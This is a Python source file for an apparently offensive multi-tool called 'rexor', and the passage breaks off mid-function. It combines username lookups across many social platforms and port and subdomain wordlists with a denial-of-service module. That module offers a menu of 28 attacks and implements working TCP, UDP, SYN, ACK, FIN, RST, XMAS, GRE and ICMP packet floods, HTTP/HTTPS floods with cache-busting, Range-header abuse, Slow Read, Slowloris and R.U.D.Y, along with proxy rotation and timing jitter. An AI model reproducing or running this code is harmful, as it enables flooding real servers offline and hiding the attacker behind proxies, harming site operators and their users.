import os
import sys
import re
import json
import time
import ssl
import csv
import socket
import struct
import base64
import random
import hashlib
import ipaddress
import threading
import subprocess
import urllib.parse
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from collections import defaultdict, deque

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "requests", "--quiet"])
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

try:
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich import box
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "rich", "--quiet"])
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich import box

try:
    import colorama
    from colorama import Fore, Style
    colorama.init()
except Exception:
    class _NCFore:
        RED = ""
    class _NCStyle:
        RESET_ALL = ""
        BRIGHT = ""
        DIM = ""
        NORMAL = ""
    Fore = _NCFore()
    Style = _NCStyle()

ce = Console()
VERSION = "28.03.1"
CONFIG_DIR = Path.home() / ".rexor"
CONFIG_DIR.mkdir(exist_ok=True)
LOG_DIR = CONFIG_DIR / "logs"
LOG_DIR.mkdir(exist_ok=True)
RESULTS_DIR = CONFIG_DIR / "results"
RESULTS_DIR.mkdir(exist_ok=True)
CONFIG_PATH = CONFIG_DIR / "config.toml"

DNS_AVAILABLE = True
try:
    import dns.resolver
    import dns.exception
    import dns.query
    import dns.zone
    import dns.rdatatype
except ImportError:
    DNS_AVAILABLE = False

WHOIS_AVAILABLE = True
try:
    import whois
except ImportError:
    WHOIS_AVAILABLE = False

SCAPY_AVAILABLE = True
try:
    from scapy.all import IP, TCP, UDP, ICMP, Raw, GRE, send, conf as scapy_conf
    scapy_conf.verb = 0
except ImportError:
    SCAPY_AVAILABLE = False

# Tuff ascii art from patorjk tools acid 3d i think
BANNER = """[bold red]
 █▀▀▀▀▀▀▀▀▀▀▄▄▀▄▄        ▄▀▀▀▀▀▀▄▄▀▄▄ ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄       ▄▄▀▀▀▀▀▄▄▀▄▄    █▀▀▀▀▀▀▀▀▀▀▄▄▀▄▄
██      ■ ▄▄ ▀▄█▀▄    ▄▀▀        ██▀▄██▀▀▀▀▀███▄▀█▀▀▀▀▄██   ▄▀▀   ■ ▄▄ ▀▄█▀▄  ██      ■ ▄▄ ▀▄█▀▄
▀▄▄         ▀▄ ██▀▄  ██  ▄■·     █ ██▐▌▌ ▄■·█████ ▄■· ████ ██         ▀▄ ██▀▄ ▀▄▄         ▀▄ ██▀▄
 ▐▌▌   █▀▄▄   ▌▐▌█▐▌▐▌▌▄▀  ▄▀▀▄▄▀█▄▀ ▐▌▌▐   ███▐▌▌    ████▐▌▌    ▄▀▄▄   ▌▐▌█▐▌ ▐▌▌   █▀▄▄   ▌▐▌█▐▌
  ██   █▄▄▀   ▄████ ██ ▌  █▄▄▄▄▄▄     ▀▄▄ ░░█████ ▒▄▀▐██████    █████ ░   ████  ██   █▄▄▀   ▄████
  ██ ░▒░░░░ ▄█▀█▄   ██  ░░ ■  ████      ██▐▌▀▄▄▀▀▐▓ ▌████ ██ ░  █████ ▒▒▒ ████  ██ ░▒░░░░ ▄█▀█▄
 ▐▌▌▒▒▌█▀▄░▒░▀██▀▄  ██ ▒▒█▐█▀▀▀▀▀     ▄▀▀▄▓▓▄▄▄▄▄░▒▌████  ██▐▒▒ ██ ██▐▓▓▓▌█ ██ ▐▌▌▒▒▌█▀▄░▒░▀██▀▄
 ▐▌▌▓▓▌████▐▓▄ ██▐▌ ██ ░▓▓▄▀▄▄▀▀▄█▀▄ ▐▌▌▓▓▓▌▄▄▄▄▄ ▓▓▐████ ▐▌▌▓▓▓▄▀▄▀▀▄█▓▒▐▌█▐▌ ▐▌▌▓▓▌████▐▓▄ ██▐▌
 ██▐▓▒▌████▐▒░▌████ ▐▌▌ ░▒▒░▄▄▄▌▀▄█▀▄▐▌▌▒▒▒ █████ ▒▒▒▐████ ██▐▓▒░█▄▄█░▒░▌████  ██▐▓▒▌████▐▒░▌████
▄▀▀▐░█▌████▐▓▀▄▀ ▄▀  ▀▄▄ ▀▀██▓▒░ █  ██  ░░░ ████  ░░░ ████  ▀▄▄▀▀▒░▓▓░▓▀▄▀ ▄▀ ▄▀▀▐░█▌████▐▓▀▄▀ ▄▀
█▄▄▄▄▄▄▄███▄▀▀▄▀▀      ▀▀▄▄▄▄▄▄▀▀▄▀▀ █▄▄▄▄▄▄████▄▄▄▄▄▄████    ▀▀▄▄▄▄▄▄▀▀▄▀▀   █▄▄▄▄▄▄▄███▄▀▀▄▀▀
[/bold red]"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

PLATFORMS = {
    "instagram": "https://www.instagram.com/{}",
    "twitter": "https://twitter.com/{}",
    "github": "https://github.com/{}",
    "youtube": "https://www.youtube.com/@{}",
    "reddit": "https://www.reddit.com/user/{}",
    "tiktok": "https://www.tiktok.com/@{}",
    "facebook": "https://www.facebook.com/{}",
    "snapchat": "https://www.snapchat.com/add/{}",
    "telegram": "https://t.me/{}",
    "pinterest": "https://www.pinterest.com/{}",
    "twitch": "https://www.twitch.tv/{}",
    "steam": "https://steamcommunity.com/id/{}",
    "spotify": "https://open.spotify.com/user/{}",
    "soundcloud": "https://soundcloud.com/{}",
    "medium": "https://medium.com/@{}",
    "devianart": "https://www.deviantart.com/{}",
    "flickr": "https://www.flickr.com/people/{}",
    "vimeo": "https://vimeo.com/{}",
    "dribbble": "https://dribbble.com/{}",
    "behance": "https://www.behance.net/{}",
    "patreon": "https://www.patreon.com/{}",
    "cashapp": "https://cash.app/${}",
    "paypal": "https://www.paypal.me/{}",
    "venmo": "https://venmo.com/{}",
    "onlyfans": "https://onlyfans.com/{}",
    "linktree": "https://linktr.ee/{}",
    "aboutme": "https://about.me/{}",
    "keybase": "https://keybase.io/{}",
    "hackernews": "https://news.ycombinator.com/user?id={}",
    "lobsters": "https://lobste.rs/u/{}",
    "producthunt": "https://www.producthunt.com/@{}",
    "roblox": "https://www.roblox.com/user.aspx?username={}",
    "chess": "https://www.chess.com/member/{}",
    "tryhackme": "https://tryhackme.com/p/{}",
    "hackthebox": "https://app.hackthebox.com/profile/{}",
    "gitlab": "https://gitlab.com/{}",
    "bitbucket": "https://bitbucket.org/{}",
    "wordpress": "https://{}.wordpress.com",
    "tumblr": "https://{}.tumblr.com",
    "etsy": "https://www.etsy.com/people/{}",
    "quora": "https://www.quora.com/profile/{}",
    "slideshare": "https://www.slideshare.net/{}",
    "disqus": "https://disqus.com/by/{}",
    "pastebin": "https://pastebin.com/u/{}",
    "wattpad": "https://www.wattpad.com/user/{}",
    "goodreads": "https://www.goodreads.com/{}",
    "letterboxd": "https://letterboxd.com/{}",
    "myanimelist": "https://myanimelist.net/profile/{}",
    "codewars": "https://www.codewars.com/users/{}",
    "leetcode": "https://leetcode.com/{}",
    "replit": "https://replit.com/@{}",
    "codepen": "https://codepen.io/{}",
    "instructables": "https://www.instructables.com/member/{}",
    "mixcloud": "https://www.mixcloud.com/{}",
    "bandcamp": "https://{}.bandcamp.com",
    "discogs": "https://www.discogs.com/user/{}",
    "lastfm": "https://www.last.fm/user/{}",
    "imgur": "https://imgur.com/user/{}",
    "giphy": "https://giphy.com/{}",
    "dailymotion": "https://www.dailymotion.com/{}",
    "myspace": "https://myspace.com/{}",
    "sourceforge": "https://sourceforge.net/u/{}/",
    "askfm": "https://ask.fm/{}",
    "strava": "https://www.strava.com/athletes/{}",
    "untappd": "https://untappd.com/user/{}",
    "vsco": "https://vsco.co/{}/gallery",
    "weheartit": "https://weheartit.com/{}",
    "periscope": "https://www.pscp.tv/{}",
    "dlive": "https://dlive.tv/{}",
    "odysee": "https://odysee.com/@{}",
    "bitchute": "https://www.bitchute.com/channel/{}",
    "rumble": "https://rumble.com/user/{}",
    "minds": "https://www.minds.com/{}",
    "gab": "https://gab.com/{}",
    "mewe": "https://mewe.com/i/{}",
    "threads": "https://www.threads.net/@{}",
    "truthsocial": "https://truthsocial.com/@{}",
    "gettr": "https://gettr.com/user/{}",
}

TOP_1000_PORTS = list(range(1, 1001)) + [
    1433, 1521, 1723, 2049, 2082, 2083, 2181, 2222, 2375, 2376,
    3000, 3128, 3260, 3306, 3389, 4444, 4848, 5000, 5060, 5222,
    5357, 5432, 5555, 5601, 5672, 5900, 5984, 6000, 6379, 6443,
    7001, 7002, 7077, 8000, 8008, 8080, 8081, 8086, 8088, 8090,
    8161, 8200, 8300, 8443, 8500, 8529, 8834, 8880, 8888, 8983,
    9000, 9001, 9042, 9060, 9090, 9092, 9100, 9200, 9300, 9418,
    9443, 9999, 10000, 10250, 11211, 15672, 16379, 27017, 27018,
    28017, 50000, 50070, 61616,
]

COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S", 1723: "PPTP",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
    8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB", 5000: "UPnP",
    9200: "Elasticsearch", 11211: "Memcached", 25565: "Minecraft", 5060: "SIP",
    9090: "Webmin", 8888: "Jupyter", 3000: "Grafana", 9000: "SonarQube",
    8000: "Django-Dev", 8081: "HTTP-Alt2", 8880: "HTTP-Alt3",
    1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 2375: "Docker", 2376: "Docker-TLS",
    3128: "Squid", 5222: "XMPP", 5601: "Kibana", 5672: "RabbitMQ", 5984: "CouchDB",
    6443: "K8s-API", 7001: "WebLogic", 8086: "InfluxDB", 8500: "Consul",
    8529: "ArangoDB", 8983: "Solr", 9042: "Cassandra", 9092: "Kafka",
    9418: "Git", 10000: "Webmin-Alt", 15672: "RabbitMQ-Mgmt", 50070: "Hadoop",
}

SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "admin", "blog", "shop", "api", "dev",
    "cdn", "vpn", "webmail", "remote", "portal", "staging", "test",
    "beta", "app", "dashboard", "monitor", "status", "docs",
    "support", "help", "secure", "auth", "login", "signup",
    "m", "mobile", "static", "assets", "media", "images", "img",
    "files", "download", "upload", "forum", "community", "news",
    "store", "pay", "billing", "my", "account", "profile",
    "internal", "corp", "intranet", "jenkins", "git", "svn",
    "wiki", "confluence", "jira", "kibana", "grafana", "prometheus",
    "registry", "docker", "k8s", "kubernetes", "api-docs", "swagger",
    "s3", "storage", "backup", "db", "mysql", "postgres", "redis",
    "elastic", "kafka", "rabbitmq", "ns1", "ns2", "dns", "mx", "smtp",
    "imap", "pop", "ldap", "sso", "oauth", "cdn2", "assets2", "static2",
]

PLATFORM_FINGERPRINTS = {
    "instagram": ["Login", "Sign up", "log in", "accounts/login"],
    "twitter": ["This account doesn't exist", "Sorry, that page doesn"],
    "github": ["Find repositories", "Sign in to GitHub"],
    "reddit": ["page not found", "Sorry, nobody on Reddit"],
    "tiktok": ["Couldn't find this account", "page not found"],
    "facebook": ["The link you followed may be broken", "page isn't available"],
    "onlyfans": ["This page is not available", "Page Not Found"],
    "snapchat": ["This content could not be found", "Sorry!"],
    "youtube": ["This channel does not exist", "404 Not Found"],
    "steam": ["The specified profile could not be found", "Error"],
    "twitch": ["Sorry. Unless you", "time machine"],
    "spotify": ["Page not found", "We can't seem to find"],
    "pinterest": ["We couldn't find that page", "Nothing found"],
}

SERVICE_BANNER_PATTERNS = [
    (re.compile(r"SSH-([\d.]+)-([\w.]+)", re.I), "SSH"),
    (re.compile(r"Server: ([^\r\n]+)", re.I), "HTTP"),
    (re.compile(r"220[- ]([^\r\n]+)", re.I), "FTP"),
    (re.compile(r"\* OK (.*)", re.I), "IMAP"),
    (re.compile(r"\+OK (.*)", re.I), "POP3"),
    (re.compile(r"220 (.*) ESMTP", re.I), "SMTP"),
    (re.compile(r"^MySQL", re.I | re.M), "MySQL"),
    (re.compile(r"^Redis", re.I | re.M), "Redis"),
    (re.compile(r"^MongoDB", re.I | re.M), "MongoDB"),
    (re.compile(r"^RFB (\d+)", re.I), "VNC"),
    (re.compile(r"^AMQP", re.I | re.M), "AMQP"),
]

ATTACK_MENU = {
    "1":  ("tcp",         "TCP Flood"),
    "2":  ("udp",         "UDP Flood"),
    "3":  ("udpfrag",     "UDP Fragment Flood"),
    "4":  ("gre",         "GRE Flood"),
    "5":  ("syn",         "SYN Flood"),
    "6":  ("ack",         "ACK Flood"),
    "7":  ("fin",         "FIN Flood"),
    "8":  ("rst",         "RST Flood"),
    "9":  ("xmas",        "XMAS Flood"),
    "10": ("http",        "HTTP Flood"),
    "11": ("https",       "HTTPS Flood"),
    "12": ("range",       "Range Header Abuse"),
    "13": ("slowread",    "Slow Read"),
    "14": ("icmp",        "ICMP Flood"),
    "15": ("loris",       "Slowloris"),
    "16": ("rudy",        "R.U.D.Y"),
    "17": ("ws",          "WebSocket Flood"),
    "18": ("reuse",       "Connection Reuse"),
    "19": ("tlsreneg",    "TLS Renegotiation"),
    "20": ("subspray",    "Subdomain Spray"),
    "21": ("dnsamp",      "DNS Amp"),
    "22": ("ntpamp",      "NTP Amp"),
    "23": ("memamp",      "Memcached Amp"),
    "24": ("ssdp",        "SSDP Amp"),
    "25": ("connexhaust", "Connection Exhaust"),
    "26": ("bandwidth",   "Bandwidth Flood"),
    "27": ("multi",       "Multi-Vector"),
    "28": ("dryrun",      "Dry Run (validate only)"),
    "0":  ("back",        "Back"),
}


class Logger:
    def __init__(self, name):
        self.path = LOG_DIR / f"{name}.log"
        self.lock = threading.Lock()

    def write(self, msg):
        try:
            with self.lock:
                with open(self.path, "a", encoding="utf-8") as f:
                    f.write(f"[{datetime.now().isoformat()}] {msg}\n")
        except Exception:
            pass


log = Logger("rexor")


class Config:
    DEFAULTS = {
        "threads": 100,
        "sockets": 50,
        "timeout": 10,
        "proxy_file": "",
        "proxy_rotate": True,
        "proxy_health_check": 60,
        "jitter_ms": 150,
        "max_sockets": 2000,
        "shodan_api_key": "",
        "virustotal_api_key": "",
        "hibp_api_key": "",
    }

    def __init__(self):
        self.data = dict(self.DEFAULTS)
        self.load()

    def load(self):
        if not CONFIG_PATH.exists():
            return
        try:
            for line in CONFIG_PATH.read_text().splitlines():
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                k = k.strip()
                v = v.strip().strip('"').strip("'")
                if k in self.DEFAULTS:
                    default = self.DEFAULTS[k]
                    if isinstance(default, bool):
                        v = v.lower() in ("1", "true", "yes", "on")
                    elif isinstance(default, int):
                        try:
                            v = int(v)
                        except ValueError:
                            continue
                    self.data[k] = v
        except Exception:
            pass

    def get(self, key):
        return self.data.get(key, self.DEFAULTS.get(key))

    def set(self, key, value):
        if key in self.DEFAULTS:
            self.data[key] = value
            self.save()

    def save(self):
        try:
            lines = ["# rexor config"]
            for k, v in self.data.items():
                if isinstance(v, bool):
                    v = "true" if v else "false"
                lines.append(f"{k} = {v}")
            CONFIG_PATH.write_text("\n".join(lines) + "\n")
        except Exception:
            pass


class ProxyManager:
    def __init__(self, proxy_file=None, rotate=True, health_check_interval=60):
        self.pool = []
        self.lock = threading.Lock()
        self.rotate = rotate
        self.health_check_interval = health_check_interval
        self.latency = {}
        self.failures = defaultdict(int)
        self.disabled = set()
        self.health_thread = None
        self.stop_health = threading.Event()
        if proxy_file:
            self.load_from_file(proxy_file)

    def load_from_file(self, path):
        path = Path(path)
        if not path.exists():
            ce.print(f"[!] Proxy file not found: {path}")
            return 0
        count = 0
        for line in path.read_text().splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            proxy = self._normalize(line)
            if proxy:
                self.pool.append(proxy)
                count += 1
        ce.print(f"[+] Loaded {count} proxies")
        return count

    def _normalize(self, line):
        line = line.strip()
        if not line:
            return None
        if "://" in line:
            return line
        parts = line.split(":")
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        if len(parts) == 5:
            return f"{parts[0]}://{parts[3]}:{parts[4]}@{parts[1]}:{parts[2]}"
        return None

    def get(self, strategy="weighted"):
        with self.lock:
            available = [p for p in self.pool if p not in self.disabled]
            if not available:
                return None
            if not self.rotate:
                return available[0]
            if strategy == "random":
                return random.choice(available)
            if strategy == "fastest":
                return min(available, key=lambda p: self.latency.get(p, 9999))
            weights = []
            for p in available:
                base = 1.0 / (1.0 + self.latency.get(p, 2.0))
                penalty = 1.0 / (1.0 + self.failures[p])
                weights.append(base * penalty)
            total = sum(weights)
            if total <= 0:
                return random.choice(available)
            r = random.uniform(0, total)
            upto = 0
            for p, w in zip(available, weights):
                upto += w
                if upto >= r:
                    return p
            return available[-1]

    def mark_result(self, proxy, success, latency=None):
        if proxy is None:
            return
        if success:
            self.failures[proxy] = max(0, self.failures[proxy] - 1)
            if latency is not None:
                self.latency[proxy] = latency
        else:
            self.failures[proxy] += 1
            if self.failures[proxy] >= 5:
                with self.lock:
                    self.disabled.add(proxy)

    def health_check(self):
        while not self.stop_health.is_set():
            with self.lock:
                candidates = list(self.pool)
            for proxy in candidates:
                if self.stop_health.is_set():
                    break
                try:
                    start = time.time()
                    r = requests.get("http://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=8)
                    latency = time.time() - start
                    if r.status_code == 200:
                        self.mark_result(proxy, True, latency)
                    else:
                        self.mark_result(proxy, False)
                except Exception:
                    self.mark_result(proxy, False)
            self.stop_health.wait(self.health_check_interval)

    def start_health_loop(self):
        if self.health_thread is None or not self.health_thread.is_alive():
            self.stop_health.clear()
            self.health_thread = threading.Thread(target=self.health_check, daemon=True)
            self.health_thread.start()

    def stop(self):
        self.stop_health.set()

    def stats(self):
        with self.lock:
            return {
                "total": len(self.pool),
                "available": len([p for p in self.pool if p not in self.disabled]),
                "disabled": len(self.disabled),
                "avg_latency": sum(self.latency.values()) / max(1, len(self.latency)),
            }


class Stats:
    def __init__(self):
        self.packets = 0
        self.bytes = 0
        self.errors = 0
        self.start_time = 0
        self.method = ""
        self.lock = threading.Lock()
        self.tp_ema = 0.0
        self._last_bytes = 0
        self._last_pkt = 0
        self._last_t = 0

    def add_packet(self, size=0):
        with self.lock:
            self.packets += 1
            self.bytes += size

    def add_error(self):
        with self.lock:
            self.errors += 1

    def get_elapsed(self):
        return time.time() - self.start_time if self.start_time else 0

    def get_pps(self):
        with self.lock:
            now = time.time()
            if self._last_t == 0:
                self._last_t = now
                self._last_pkt = self.packets
                return 0.0
            dt = now - self._last_t
            if dt <= 0:
                return 0.0
            dp = self.packets - self._last_pkt
            self._last_t = now
            self._last_pkt = self.packets
            return dp / dt

    def get_mbps(self):
        with self.lock:
            now = time.time()
            if self._last_t == 0:
                return 0.0
            dt = max(0.001, now - self._last_t)
            db = self.bytes - self._last_bytes
            self._last_bytes = self.bytes
            raw = (db * 8 / 1_000_000) / dt
            alpha = 0.3
            self.tp_ema = alpha * raw + (1 - alpha) * self.tp_ema
            return self.tp_ema

    def reset(self, method):
        with self.lock:
            self.packets = 0
            self.bytes = 0
            self.errors = 0
            self.start_time = time.time()
            self.method = method.upper()
            self.tp_ema = 0.0
            self._last_bytes = 0
            self._last_pkt = 0
            self._last_t = time.time()


class RexorFloods:
    DEAD_METHODS = {"smurf", "pod", "teardrop", "land"}

    def __init__(self, proxy_manager=None, config=None):
        self.running = False
        self.stats = Stats()
        self.config = config or Config()
        self.sock_list = deque(maxlen=self.config.get("max_sockets"))
        self.sock_lock = threading.Lock()
        self.proxy_manager = proxy_manager
        self.top_talkers = defaultdict(int)
        self.talkers_lock = threading.Lock()
        self.reaper = None
        self._ws_ua = random.choice(USER_AGENTS)

    def _gen_payload(self, size):
        return os.urandom(size)

    def _add_socket(self, s):
        with self.sock_lock:
            self.sock_list.append(s)

    def _reap(self):
        while self.running:
            time.sleep(15)
            if not self.running:
                break
            with self.sock_lock:
                while len(self.sock_list) > self.config.get("max_sockets") * 0.8:
                    try:
                        self.sock_list.popleft().close()
                    except Exception:
                        pass

    def _cleanup_sockets(self):
        with self.sock_lock:
            for s in list(self.sock_list):
                try:
                    s.close()
                except Exception:
                    pass
            self.sock_list.clear()

    def _jitter(self):
        j = self.config.get("jitter_ms")
        if j:
            time.sleep(random.uniform(0, j) / 1000.0)

    def _record_talker(self, ip):
        with self.talkers_lock:
            self.top_talkers[ip] += 1
            if len(self.top_talkers) > 20:
                self.top_talkers.pop(next(iter(self.top_talkers)))

    def _tcp_flood(self, ip, port, size):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(0.5)
                s.connect((ip, port))
                s.send(self._gen_payload(size))
                self.stats.add_packet(size)
                self._add_socket(s)
                self._record_talker(ip)
            except Exception:
                self.stats.add_error()

    def _udp_flood(self, ip, port, size):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                s.sendto(self._gen_payload(size), (ip, port))
                s.close()
                self.stats.add_packet(size)
                self._record_talker(ip)
            except Exception:
                self.stats.add_error()

    def _udp_fragment_flood(self, ip, port, size):
        if not SCAPY_AVAILABLE:
            self._udp_flood(ip, port, size)
            return
        frag_size = max(8, size // 4)
        while self.running:
            try:
                payload = self._gen_payload(size)
                for i in range(0, len(payload), frag_size):
                    frag = payload[i:i + frag_size]
                    pkt = IP(dst=ip, flags="MF", frag=(i // 8)) / UDP(sport=random.randint(1024, 65535), dport=port) / Raw(load=frag)
                    send(pkt, verbose=False)
                    self.stats.add_packet(len(frag))
                self._record_talker(ip)
                self._jitter()
            except Exception:
                self.stats.add_error()

    def _gre_flood(self, ip, size):
        if not SCAPY_AVAILABLE:
            self.stats.add_error()
            return
        while self.running:
            try:
                pkt = IP(dst=ip) / GRE() / Raw(load=self._gen_payload(size))
                send(pkt, verbose=False)
                self.stats.add_packet(size)
                self._jitter()
            except Exception:
                self.stats.add_error()

    def _tcp_flags_flood(self, ip, port, flags, size=0):
        if not SCAPY_AVAILABLE:
            self._tcp_flood(ip, port, size or 1024)
            return
        sport = random.randint(1024, 65535)
        while self.running:
            try:
                payload = self._gen_payload(size) if size else b""
                pkt = IP(dst=ip) / TCP(sport=sport, dport=port, flags=flags) / Raw(load=payload)
                send(pkt, verbose=False)
                self.stats.add_packet(size or 40)
                self._record_talker(ip)
                self._jitter()
            except Exception:
                self.stats.add_error()

    def _syn_flood(self, ip, port, size): self._tcp_flags_flood(ip, port, "S", size)
    def _ack_flood(self, ip, port, size): self._tcp_flags_flood(ip, port, "A", size)
    def _fin_flood(self, ip, port, size): self._tcp_flags_flood(ip, port, "F", size)
    def _rst_flood(self, ip, port, size): self._tcp_flags_flood(ip, port, "R", size)
    def _xmas_flood(self, ip, port, size): self._tcp_flags_flood(ip, port, "FPU", size)

    def _http_flood(self, ip, port, path, use_ssl=False, cache_bust=True):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(1)
                s.connect((ip, port))
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=ip)
                ua = random.choice(USER_AGENTS)
                method = random.choice(["GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"])
                if cache_bust:
                    cb = f"?cb={os.urandom(6).hex()}" if "?" not in path else f"&cb={os.urandom(6).hex()}"
                else:
                    cb = ""
                hdrs = "".join(f"X-Rand-{random.randint(1000, 9999)}: {os.urandom(6).hex()}\r\n" for _ in range(3))
                payload = (
                    f"{method} {path}{cb} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: */*\r\n"
                    f"Accept-Language: en-US,en;q=0.9\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache, no-store\r\n"
                    f"Pragma: no-cache\r\n"
                    f"{hdrs}"
                    f"\r\n"
                )
                s.send(payload.encode())
                self.stats.add_packet(len(payload))
                self._add_socket(s)
                self._record_talker(ip)
            except Exception:
                self.stats.add_error()

    def _https_flood(self, ip, port, path):
        self._http_flood(ip, 443 if port == 80 else port, path, True)

    def _range_header_flood(self, ip, port, path, use_ssl=False):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=ip)
                start = random.randint(0, 1_000_000)
                end = start + random.randint(1, 999_999)
                payload = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Range: bytes={start}-{end}\r\n"
                    f"Accept-Encoding: identity\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(payload.encode())
                self.stats.add_packet(len(payload))
                self._add_socket(s)
                self._record_talker(ip)
            except Exception:
                self.stats.add_error()

    def _slow_read_flood(self, ip, port, path, use_ssl=False):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=ip)
                s.send(
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n".encode()
                )
                self.stats.add_packet()
                self._add_socket(s)
                while self.running:
                    try:
                        s.recv(1)
                    except socket.timeout:
                        continue
                    except Exception:
                        break
                    time.sleep(random.uniform(8, 15))
            except Exception:
                self.stats.add_error()

    def _icmp_flood(self, ip, size):
        if SCAPY_AVAILABLE:
            while self.running:
                try:
                    pkt = IP(dst=ip) / ICMP() / Raw(load=self._gen_payload(size))
                    send(pkt, verbose=False)
                    self.stats.add_packet(size)
                    self._record_talker(ip)
                    self._jitter()
                except Exception:
                    self.stats.add_error()
            return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        except PermissionError:
            ce.print("[!] ICMP requires root/admin")
            return
        while self.running:
            try:
                s.sendto(self._gen_payload(size), (ip, 0))
                self.stats.add_packet(size)
            except Exception:
                self.stats.add_error()

    def _loris_flood(self, ip, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                s.connect((ip, port))
                s.send(
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept: text/html\r\n"
                    f"Connection: keep-alive\r\n".encode()
                )
                self.stats.add_packet()
                self._add_socket(s)
                for _ in range(random.randint(100, 500)):
                    if not self.running:
                        break
                    try:
                        s.send(f"X-a: {os.urandom(random.randint(5, 20)).hex()}\r\n".encode())
                        self.stats.add_packet()
                        time.sleep(random.uniform(1, 10))
                    except Exception:
                        break
            except Exception:
                self.stats.add_error()

    def _rudy_flood(self, ip, port, path):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((ip, port))
                cl = random.randint(1_000_000, 10_000_000)
                s.send(
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
